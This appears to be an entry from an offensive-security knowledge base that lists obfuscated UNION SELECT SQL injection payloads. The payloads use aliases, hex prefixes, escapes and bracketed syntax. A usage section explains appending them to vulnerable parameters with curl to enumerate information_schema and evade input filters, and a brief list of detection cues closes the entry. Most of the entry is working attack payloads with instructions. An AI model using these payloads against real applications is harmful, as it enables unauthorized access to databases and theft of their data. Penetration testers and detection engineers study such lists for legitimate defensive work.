---
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:36.798549+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - sql-injection
  - obfuscation
  - union
validated: true
---

# Generic-Union-Based-SQL-Injection-Payloads

## Code

```sql
.1UNION	SELECT	2	
1.UNION	SELECT.2alias	
1e0UNION	SELECT	2	
1e1AND-1=0.0UNION	SELECT	2	
SELECT	0xUNION	SELECT	2	
SELECT\UNION	SELECT	2	
\1UNION	SELECT	2	
SELECT	1FROM[table]WHERE\1=\1AND\1=\1	
SELECT"table_name"FROM[information_schema].[tables]	
```

## Description

This snippet provides generic obfuscated UNION SELECT payloads applicable to multiple SQL dialects. It includes variations with aliases, hex prefixes, escapes, and bracketed syntax to combine SELECT results and target information_schema for schema enumeration, helping evade basic input filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| table | Target table name in the payload | users or information_schema.tables |
| table_name | Specific column to extract | table_name |
| 1,2 | Column fillers to match query structure | 1 or NULL |

## Usage

Use these in manual injection tools like curl to append to vulnerable queries: ?id=-1' [payload]. They are useful for initial union testing or when DBMS is unknown, progressing to DBMS-specific if needed. In procedures, embed after column count determination to dump tables: SELECT table_name FROM information_schema.tables via UNION.

## Detection

- Intrusion detection systems (IDS) alerting on escaped or bracketed SQL in HTTP parameters.
- Query parsing in databases flagging UNION with non-standard syntax.
- Response analysis showing concatenated legitimate and schema data.
- Increased query volume to info_schema from single IP.

## Related

- [[procedures/Union-Based-SQL-Injection-with-DBMS-Obfuscation]]
- [[commands/curl-manual-union-injection]]
